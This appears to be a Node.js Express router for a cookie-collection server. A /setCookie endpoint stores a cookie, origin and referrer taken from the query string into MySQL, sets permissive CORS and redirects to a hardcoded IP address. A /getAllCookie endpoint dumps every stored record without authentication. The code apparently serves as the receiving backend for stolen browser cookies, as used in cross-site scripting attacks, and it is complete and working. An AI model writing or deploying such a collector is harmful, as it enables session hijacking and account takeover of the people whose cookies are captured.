const express = require('express')
const dayjs = require('dayjs')
const router = express.Router()
const { connection } = require('../../db/mysql')

// 获取cookie 并插入数据库中
router.get('/setCookie', (req, res) => {
  const { cookie, origin = null, refer = null } = req.query
  const date = dayjs().format('YYYY-MM-DD HH:mm:ss')
  const sql = 'insert into sys(cookie, refer, origin, date) values (?, ?, ?, ?)'
  connection.query(sql, [cookie, refer, origin, date], (err, resulut) => {
    console.log(err, 'err')
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.status(301)
    res.redirect('http://43.138.250.40:9002')
  })
})

router.get('/getAllCookie', (req, res) => {
  const sql = 'select * from sys'
  connection.query(sql, (err, resulut) => {
    if (err) {
      res.send({
        code: 500,
        msg: '系统错误'
      })
    }
    res.send({
      code: 200,
      data: resulut
    })
  })
})

module.exports = router
